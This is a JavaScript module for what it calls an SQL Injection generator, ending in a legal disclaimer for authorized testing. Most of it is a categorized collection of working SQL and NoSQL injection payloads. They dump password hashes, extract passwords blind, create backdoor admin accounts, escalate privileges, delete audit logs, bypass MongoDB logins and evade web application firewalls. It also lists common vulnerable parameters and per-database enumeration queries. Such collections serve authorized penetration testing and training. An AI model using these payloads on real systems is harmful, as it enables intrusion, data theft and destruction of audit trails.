export const SQL_INJECTION_CATEGORIES = {
  UNION_BASED: 'Union-Based',
  BOOLEAN_BLIND: 'Boolean-Based Blind',
  TIME_BASED_BLIND: 'Time-Based Blind',
  ERROR_BASED: 'Error-Based',
  STACKED_QUERIES: 'Stacked Queries',
  NOSQL: 'NoSQL Injection',
  SECOND_ORDER: 'Second-Order',
  WAF_BYPASS: 'WAF Bypass'
};

const payloads = {
  UNION_BASED: [
    {
      name: 'Basic Union Select',
      description: 'Concatenate results from different tables',
      payload: `' UNION SELECT NULL,NULL,NULL FROM users--`,
      explanation: 'Uses UNION to append results from another query. Replace NULL count with actual column count.'
    },
    {
      name: 'Extract User Data',
      description: 'Dump username and password hashes',
      payload: `' UNION SELECT username, password, email FROM users--`,
      explanation: 'Retrieves sensitive data from users table after matching column count.'
    },
    {
      name: 'Database Version',
      description: 'Get database version and user info',
      payload: `' UNION SELECT version(), user(), database()--`,
      explanation: 'MySQL/PostgreSQL version enumeration. Syntax varies by database.'
    },
    {
      name: 'Table Enumeration',
      description: 'List all tables in database',
      payload: `' UNION SELECT table_name, table_schema, NULL FROM information_schema.tables--`,
      explanation: 'Enumerates database structure via information_schema (MySQL/PostgreSQL).'
    },
    {
      name: 'Column Enumeration',
      description: 'List columns in specific table',
      payload: `' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users'--`,
      explanation: 'Discovers sensitive columns before targeted extraction.'
    },
    {
      name: 'File Read (MySQL)',
      description: 'Read local files (if permissions allow)',
      payload: `' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL--`,
      explanation: 'MySQL-specific: Requires FILE privilege. Works on Linux systems.'
    }
  ],

  BOOLEAN_BLIND: [
    {
      name: 'Length Detection',
      description: 'Find password length using substring',
      payload: `' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--`,
      explanation: 'Tests character-by-character. True if first char is "a".'
    },
    {
      name: 'Database Version Check',
      description: 'Verify database type via version string',
      payload: `' AND SUBSTRING((SELECT version()),1,1)='5'--`,
      explanation: 'Determines if MySQL 5.x by checking version string start.'
    },
    {
      name: 'User Existence',
      description: 'Check if user exists in database',
      payload: `' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--`,
      explanation: 'Returns true if admin user exists, false otherwise.'
    },
    {
      name: 'Conditional Response',
      description: 'Use IF statements for blind testing',
      payload: `' AND IF((SELECT COUNT(*) FROM users)>0, 1, (SELECT * FROM nonexistent))--`,
      explanation: 'If true, returns 1. If false, query error reveals information.'
    },
    {
      name: 'Bit-Level Extraction',
      description: 'Extract ASCII values bit-by-bit',
      payload: `' AND (SELECT ASCII(SUBSTRING(password,1,1)) & 1 FROM users LIMIT 1)=1--`,
      explanation: 'Uses bitwise operations for faster binary extraction.'
    }
  ],

  TIME_BASED_BLIND: [
    {
      name: 'Basic Sleep Delay',
      description: 'Introduce time delay to confirm injection',
      payload: `' AND SLEEP(5)--`,
      explanation: 'MySQL: 5-second delay if vulnerable. Total response time reveals boolean.'
    },
    {
      name: 'Conditional Sleep',
      description: 'Sleep only if condition is true',
      payload: `' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--`,
      explanation: 'Delays if table exists. Used for blind enumeration.'
    },
    {
      name: 'Password Extraction via Time',
      description: 'Extract password character-by-character',
      payload: `' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--`,
      explanation: 'Each character takes 5 seconds to test. Automate with BURP/Python scripts.'
    },
    {
      name: 'WAITFOR (MSSQL)',
      description: 'MSSQL time-based injection',
      payload: `'; WAITFOR DELAY '00:00:05'--`,
      explanation: 'Microsoft SQL Server equivalent to SLEEP().'
    },
    {
      name: 'pg_sleep (PostgreSQL)',
      description: 'PostgreSQL time-based injection',
      payload: `'; SELECT pg_sleep(5);--`,
      explanation: 'PostgreSQL sleep function for time-based blind SQL injection.'
    },
    {
      name: 'Oracle Time Delay',
      description: 'Oracle time-based injection',
      payload: `' AND (SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE NULL END FROM dual)--`,
      explanation: 'Oracle-specific time-based blind SQL injection technique.'
    }
  ],

  ERROR_BASED: [
    {
      name: 'Syntax Error',
      description: 'Force syntax error to extract data',
      payload: `' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))--`,
      explanation: 'MySQL error-based: extractvalue() error message leaks query results.'
    },
    {
      name: 'Subquery Extraction',
      description: 'Extract data via error messages',
      payload: `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password), FLOOR(RAND()*2)) FROM users GROUP BY 1) x)--`,
      explanation: 'Duplicate key error reveals database content.'
    },
    {
      name: 'XML Path (MSSQL)',
      description: 'MSSQL error-based injection',
      payload: `' AND 1=CONVERT(INT, (SELECT @@version))--`,
      explanation: 'Type conversion error reveals MSSQL version and system info.'
    },
    {
      name: 'CastingError (PostgreSQL)',
      description: 'PostgreSQL error-based injection',
      payload: `'; SELECT CAST((SELECT version()) AS INT);--`,
      explanation: 'Type mismatch error displays PostgreSQL version.'
    },
    {
      name: 'Line Comment Errors',
      description: 'Inject data into error strings',
      payload: `' AND 1=CAST((SELECT CONCAT(user,password) FROM users LIMIT 1) AS SIGNED)--`,
      explanation: 'MySQL concat() with type conversion forces error output.'
    }
  ],

  STACKED_QUERIES: [
    {
      name: 'Insert Data',
      description: 'Add new records to database',
      payload: `'; INSERT INTO users (username, password) VALUES ('hacker', md5('password'));--`,
      explanation: 'Only works if stacked queries allowed. Creates backdoor account.'
    },
    {
      name: 'Update Existing',
      description: 'Modify existing database records',
      payload: `'; UPDATE users SET role='admin' WHERE username='attacker';--`,
      explanation: 'Escalates privileges if stacked queries supported (MSSQL, MySQL w/ multiple statements).'
    },
    {
      name: 'Delete Records',
      description: 'Remove data from database',
      payload: `'; DELETE FROM logs WHERE timestamp < NOW() - INTERVAL 30 DAY;--`,
      explanation: 'Destroys audit trail. High damage potential.'
    },
    {
      name: 'Create Backup User',
      description: 'Create administrative backdoor account',
      payload: `'; CREATE USER 'backdoor'@'%' IDENTIFIED BY 'p@ssw0rd'; GRANT ALL ON *.* TO 'backdoor'@'%';--`,
      explanation: 'MySQL: Creates rogue admin account with full database access.'
    },
    {
      name: 'Stored Procedure Injection',
      description: 'Modify stored procedure behavior',
      payload: `'; DROP PROCEDURE auth_user; CREATE PROCEDURE auth_user(IN u VARCHAR(255)) BEGIN SELECT 1; END;--`,
      explanation: 'Replaces authentication stored procedure to bypass login.'
    }
  ],

  NOSQL: [
    {
      name: 'MongoDB Query Bypass',
      description: 'Authentication bypass via query object',
      payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`,
      explanation: 'MongoDB: Returns all docs where username and password are not null (auth bypass).'
    },
    {
      name: 'NoSQL Union',
      description: 'Extract data from NoSQL database',
      payload: `{"$or": [{"username": "admin"}, {"isAdmin": true}]}`,
      explanation: 'Returns matching documents. Used for data extraction.'
    },
    {
      name: 'JavaScript Injection',
      description: 'Inject JavaScript in NoSQL context',
      payload: `{"$where": "this.username == 'admin' && this.password.length > 5"}`,
      explanation: 'MongoDB $where operator executes JavaScript code.'
    },
    {
      name: 'RegEx Matching',
      description: 'Use regex for blind extraction',
      payload: `{"password": {"$regex": "^a.*"}}`,
      explanation: 'Returns docs where password starts with "a". Blind injection via regex.'
    },
    {
      name: 'CouchDB Injection',
      description: 'CouchDB query manipulation',
      payload: `{"selector": {"username": "admin", "_id": {"$gt": null}}}`,
      explanation: 'CouchDB: Comparison operators for data extraction.'
    }
  ],

  SECOND_ORDER: [
    {
      name: 'Stored Injection',
      description: 'Inject payload in one request, trigger in another',
      payload: `username: admin'; DROP TABLE users;--
On next login attempt with this user:`,
      explanation: 'Payload stored in DB, executed when data retrieved later.'
    },
    {
      name: 'Email Header Injection',
      description: 'Inject SQL via email field, trigger on notification',
      payload: `email: victim@test.com'; UPDATE users SET role='admin';--`,
      explanation: 'Stored in profile, executed when system sends notifications.'
    },
    {
      name: 'Report Comment Injection',
      description: 'Inject in comment, execute on report generation',
      payload: `comment: '); DELETE FROM audit_logs; --`,
      explanation: 'Triggers when admin generates reports including this comment.'
    },
    {
      name: 'Search History Injection',
      description: 'Store injection in search history, trigger on retrieval',
      payload: `search_query: test'; UNION SELECT password FROM users; --`,
      explanation: 'Executes when search history is viewed/exported.'
    }
  ],

  WAF_BYPASS: [
    {
      name: 'Comment Obfuscation',
      description: 'Hide injection in comments',
      payload: `' /*!50000UNION*/ SELECT 1,2,3--`,
      explanation: 'MySQL version-specific comment. WAF may not detect /*! */ syntax.'
    },
    {
      name: 'Case Variation',
      description: 'Alter case to evade filters',
      payload: `' UnIoN SeLeCt NULL,NULL,NULL--`,
      explanation: 'Case-insensitive WAF bypass. Keyword detection fails on mixed case.'
    },
    {
      name: 'Null Byte Injection',
      description: 'Insert null bytes to truncate strings',
      payload: `' OR '1'='1%00--`,
      explanation: 'Legacy WAF bypass: null byte truncates rest of query in some contexts.'
    },
    {
      name: 'Whitespace Bypass',
      description: 'Replace spaces with alternatives',
      payload: `'/*!Or*/'1'='1`,
      explanation: 'MySQL inline comments instead of spaces. Bypasses "union" detection.'
    },
    {
      name: 'Hex Encoding',
      description: 'Encode keywords in hexadecimal',
      payload: `' OR 0x31=0x31--`,
      explanation: 'Hex 0x31 = "1". Bypasses keyword matching filters.'
    },
    {
      name: 'Double URL Encoding',
      description: 'Encode special characters twice',
      payload: `%2527%20OR%20%25273%2527%253D%25273`,
      explanation: 'WAF decodes once, payload decodes again in application.'
    },
    {
      name: 'String Concatenation',
      description: 'Split keywords across concatenation',
      payload: `' OR CONCAT('UN','ION') SELECT 1--`,
      explanation: 'String functions bypass keyword blacklist detection.'
    }
  ]
};

export function getAllCategories() {
  return Object.entries(SQL_INJECTION_CATEGORIES).map(([key, label]) => ({
    key,
    label
  }));
}

export function getPayloadsByCategory(categoryKey) {
  const categoryPayloads = payloads[categoryKey];
  return categoryPayloads || [];
}

export function getAllPayloads() {
  const allPayloads = [];
  Object.keys(payloads).forEach(category => {
    allPayloads.push(...payloads[category]);
  });
  return allPayloads;
}

export function searchPayloads(query) {
  const lowerQuery = query.toLowerCase();
  return getAllPayloads().filter(
    payload =>
      payload.name.toLowerCase().includes(lowerQuery) ||
      payload.description.toLowerCase().includes(lowerQuery) ||
      payload.payload.toLowerCase().includes(lowerQuery)
  );
}

export const COMMON_VULNERABLE_PARAMETERS = [
  { name: 'Login', example: 'username parameter in login form' },
  { name: 'Search', example: 'search box that queries database' },
  { name: 'Product Filter', example: 'filter by category/price' },
  { name: 'User ID', example: 'URL parameter like ?id=123' },
  { name: 'Comment', example: 'user-generated comments stored in DB' },
  { name: 'Email', example: 'newsletter signup or profile email' },
  { name: 'Sort Parameter', example: 'sort=name or sort=date' },
  { name: 'Page Number', example: 'pagination ?page=1' }
];

export const DATABASE_INFO = {
  MySQL: {
    version: 'SELECT VERSION()',
    user: 'SELECT USER()',
    database: 'SELECT DATABASE()',
    tables: 'SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()',
    comments: '-- or #'
  },
  PostgreSQL: {
    version: 'SELECT version()',
    user: 'SELECT user',
    database: 'SELECT current_database()',
    tables: 'SELECT table_name FROM information_schema.tables WHERE table_schema=\'public\'',
    comments: '-- or /* */'
  },
  MSSQL: {
    version: 'SELECT @@version',
    user: 'SELECT user_name()',
    database: 'SELECT DB_NAME()',
    tables: 'SELECT name FROM sysobjects WHERE xtype=\'U\'',
    comments: '-- or /* */'
  },
  Oracle: {
    version: 'SELECT banner FROM v$version',
    user: 'SELECT user FROM dual',
    database: 'SELECT name FROM v$database',
    tables: 'SELECT table_name FROM user_tables',
    comments: '-- or /* */'
  },
  SQLite: {
    version: 'SELECT sqlite_version()',
    user: 'N/A',
    database: 'PRAGMA database_list',
    tables: 'SELECT name FROM sqlite_master WHERE type=\'table\'',
    comments: '--'
  }
};

export const LEGAL_DISCLAIMER = `
⚠️  LEGAL DISCLAIMER
═════════════════════════════════════════════════════════════════════════════

This SQL Injection generator is provided for EDUCATIONAL AND AUTHORIZED
SECURITY TESTING PURPOSES ONLY.

🚨 ILLEGAL USES:
• Unauthorized testing on systems you don't own or have written permission to test
• Stealing, modifying, or deleting data without authorization
• Bypassing security to gain unauthorized access
• Using this tool for fraud, extortion, or malicious purposes

⚖️  CONSEQUENCES:
• Criminal prosecution under the Computer Fraud and Abuse Act (CFAA)
• Civil liability for damages
• Imprisonment and substantial fines
• Permanent criminal record affecting employment and reputation

✅ LEGAL USES:
• Penetration testing on authorized systems with written permission
• Educational learning in controlled lab environments
• Security research and vulnerability disclosure through proper channels
• Training security professionals in responsible disclosure practices

By using this tool, you acknowledge:
1. You have explicit written authorization to test any systems
2. You understand the legal and ethical implications
3. You will not use this for unauthorized access or malicious purposes
4. You are solely responsible for any illegal use

For authorized security testing, always obtain written permission first.
`;
